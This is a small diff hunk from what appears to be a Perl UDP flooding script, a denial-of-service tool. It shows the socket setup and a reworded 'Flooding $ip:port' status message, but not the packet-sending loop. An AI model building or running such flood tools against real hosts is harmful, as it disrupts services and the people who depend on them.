@@ -16,8 +16,8 @@ $endtime = time() + ($time ? $time : 1000000);
  
 socket(flood, AF_INET, SOCK_DGRAM, 17);
 
- 
-print "Flooding $ip " . ($port ? $port : "random") . " port with " . 
+
+print "Flooding $ip:" . ($port ? $port : "random") . " with " . 
   ($size ? "$size-byte" : "random size") . " packets" . 
   ($time ? " for $time seconds" : "") . "\n";
 print "Break with Ctrl-C\n" unless $time;
